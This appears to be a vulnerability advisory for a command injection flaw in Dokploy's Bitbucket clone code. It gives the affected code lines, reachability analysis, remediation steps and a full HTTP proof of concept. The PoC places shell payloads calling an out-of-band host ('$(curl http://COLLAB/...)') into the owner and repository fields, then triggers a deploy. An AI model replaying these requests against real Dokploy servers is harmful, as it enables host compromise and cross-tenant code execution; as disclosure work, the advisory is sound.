repo.description:
| | |
|---|---|
| **Affected version** | v0.29.8 (commit `e9a0932b2`) |
| **Component** | `@dokploy/server` - Bitbucket git provider clone |
| **Authentication** | Authenticated; low-privilege `member` with service deploy permission |
| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) - both fields |

## 1. Summary
An application bound to a Bitbucket git provider stores `bitbucketOwner` and `bitbucketRepository`
without validation. At deploy time both are interpolated **unquoted** into the `git clone` URL/command
executed via `/bin/sh -c`. An authenticated user achieves OS command execution on the Dokploy host /
target server. Unlike the GitHub/GitLab/Gitea providers (which perform a live token fetch before
building the clone string and thus require a working integration), the **Bitbucket** clone builder
makes no upstream API call - it builds the command directly from stored credentials - so the sink is
reachable with attacker-supplied dummy provider credentials.

## 2. Affected code
- **Sink** - `packages/server/src/utils/providers/bitbucket.ts:125-128`
  ```js
  const repoclone = `bitbucket.org/${bitbucketOwner}/${repoToUse}.git`;     // repoToUse = bitbucketRepositorySlug || bitbucketRepository
  const cloneUrl = getBitbucketCloneUrl(bitbucket, repoclone);              // https://user:pass@<repoclone>
  command += `echo "Cloning Repo ${repoclone} ..."`;                        // $() expands inside the double quotes
  command += `git clone --branch ${bitbucketBranch} ... ${cloneUrl} ${outputPath} --progress;`;  // unquoted
  ```
  `getBitbucketCloneUrl` (`bitbucket.ts:44-49`) only reads the stored `bitbucketUsername`/`appPassword`
  - **no network/API call** precedes the interpolation.
- **Execution** - `services/application.ts:212-217` via `execAsync` / `execAsyncRemote` (`/bin/sh -c`).
- **Entry point (no validation)** - `application.saveBitbucketProvider`
  (`apps/dokploy/server/api/routers/application.ts:473`) writes `bitbucketOwner` / `bitbucketRepository`
  verbatim; `apiSaveBitbucketProvider` (`db/schema/application.ts:471`) has no content regex on either.
- The provider is created by `bitbucket.create` (`routers/bitbucket.ts:27`); `createBitbucket`
  (`services/bitbucket.ts:14`) accepts arbitrary `bitbucketUsername`/`appPassword` and ignores `authId`.

## 3. Authorization / reachability
`bitbucket.create` requires the `gitProviders:create` permission; `saveBitbucketProvider` + `deploy`
are gated only by `checkServicePermissionAndAccess` (no resource/org check for owner/admin). Reachable
by a `member` with service write+deploy, and cross-tenant by an owner/admin of another organization.

## 4. Proof of Concept (Burp)
**Step 0 - Authenticate** (Appendix A). **Step 1 - Create a project + application** → `APP_ID`.

**Step 2 - Create a Bitbucket provider with dummy credentials:**
```http
POST /api/trpc/bitbucket.create?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"name":"poc","authId":"x","bitbucketUsername":"u","appPassword":"p"}}}
```
Then read the new `bitbucketId` (and its `gitProviderId`) via:
```http
GET /api/trpc/bitbucket.bitbucketProviders?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%2C%22meta%22%3A%7B%22values%22%3A%5B%22undefined%22%5D%7D%7D%7D HTTP/1.1
Host: TARGET
Cookie: better-auth.session_token=COOKIE
Connection: close
```

**Step 3 - Bind the app to the provider with payloads in BOTH fields:**
```http
POST /api/trpc/application.saveBitbucketProvider?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"applicationId":"APP_ID","bitbucketId":"BITBUCKET_ID","bitbucketOwner":"o$(curl http://COLLAB/owner)","bitbucketRepository":"r$(curl http://COLLAB/repo)","bitbucketRepositorySlug":"","bitbucketBranch":"main","bitbucketBuildPath":"/","watchPaths":[],"enableSubmodules":false}}}
```
(Leaving `bitbucketRepositorySlug` empty makes `repoToUse` fall back to `bitbucketRepository`.)

**Step 4 - Deploy:**
```http
POST /api/trpc/application.deploy?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=COOKIE
Connection: close

{"0":{"json":{"applicationId":"APP_ID"}}}
```

**Step 5 - Observe.** The Collaborator receives **two** HTTP requests - `GET /owner` and `GET /repo`,
both `User-Agent: curl/8.18.0`, from the Dokploy host - confirming both fields execute via `/bin/sh -c`.

## 5. Impact
Arbitrary OS command execution as the Dokploy server process (host compromise) or on the target server
(`serverId`). Cross-tenant when abused by an owner/admin of another organization.

## 6. Remediation
- Validate `bitbucketOwner`/`bitbucketRepository` (and the GitHub/GitLab/Gitea equivalents) against a
  repo-name allow-list (`^[A-Za-z0-9._-]+$`); reject metacharacters.
- Build the clone with `execFile`/`spawn` argument arrays instead of an interpolated shell string.
- Validate provider credentials and enforce tenant isolation in the access helper.

## Appendix A - Authentication
```http
POST /api/auth/sign-in/email HTTP/1.1
Host: TARGET
Content-Type: application/json
Connection: close

{"email":"USER@EXAMPLE.COM","password":"PASSWORD"}
```
repo.summary: OS Command Injection via Bitbucket `owner`/`repository` in `git clone`
